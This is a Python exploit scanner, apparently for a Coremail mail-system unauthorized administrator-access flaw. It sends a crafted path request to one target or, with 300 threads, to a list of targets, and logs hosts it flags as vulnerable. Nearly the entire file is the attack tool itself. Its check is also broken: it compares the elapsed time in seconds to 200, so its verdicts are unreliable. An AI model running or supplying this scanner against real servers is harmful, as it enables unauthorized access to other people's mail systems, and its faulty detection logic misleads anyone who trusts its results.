import requests,argparse,time,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'
RESET = '\033[0m'
def banner():
	banner = """

.------..------..------..------..------..------.
|W.--. ||A.--. ||J.--. ||I.--. ||M.--. ||U.--. |
| :/\: || (\/) || :(): || (\/) || (\/) || (\/) |
| :\/: || :\/: || ()() || :\/: || :\/: || :\/: |
| '--'W|| '--'A|| '--'J|| '--'I|| '--'M|| '--'U|
`------'`------'`------'`------'`------'`------'

	"""
	print(banner)
def poc(target):
    url = target + "/coremail/common/assets/;l;/;/;/;/;/s?biz=Mzl3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa72626e68&chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&scene=2"
    print(url)
    headers={
   'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0'
    }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=8)
        res2= res.elapsed.total_seconds()
        print(res2)
        if res2 ==200 :
                   with open(r'./results.txt','a+') as f1:
                        f1.write(f'{url}\n')
                        print('[++++]'+target+'存在Coremail 邮件系统未授权访问获取管理员未授权漏洞')
                        return True
        else:
             print('[-]不存在未授权漏洞')
    except:
         print(f'[*]{target}'' is server error')
         return False

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
	main()
